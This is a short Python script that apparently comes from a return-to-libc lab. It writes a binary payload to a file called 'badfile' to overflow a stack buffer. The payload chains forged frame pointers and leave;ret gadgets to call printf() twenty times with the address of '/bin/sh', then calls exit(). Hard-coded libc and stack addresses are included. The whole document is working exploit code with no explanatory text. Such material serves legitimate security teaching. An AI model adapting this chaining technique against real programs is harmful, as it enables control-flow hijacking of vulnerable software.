#!/usr/bin/python3
import sys

def tobytes (value):
   return (value).to_bytes(4,byteorder='little')

printf_addr = 0xf7dd5120   # Address of printf()
exit_addr   = 0xf7dbc5b0   # Address of exit()
ebp_foo     = 0xffffcb78   # foo()'s frame pointer


sh_addr     = 0xf7f3ade8   # Address of "/bin/sh"

leaveret    = 0x565561ea   # Address of leaveret


content   = bytearray(0xaa for i in range(112))

# From foo() to the first function
ebp_next  = ebp_foo + 0x20
content  += tobytes(ebp_next)
content  += tobytes(leaveret)
content  += b'A' * (0x20 - 2*4)

# printf()
for i in range(20):
  ebp_next += 0x20
  content  += tobytes(ebp_next)
  content  += tobytes(printf_addr)
  content  += tobytes(leaveret)
  content  += tobytes(sh_addr)   
  content  += b'A' * (0x20 - 4*4)

# exit()
content += tobytes(0xFFFFFFFF) # The value is not important
content += tobytes(exit_addr)

# Write the content to a file
with open("badfile", "wb") as f:
  f.write(content)

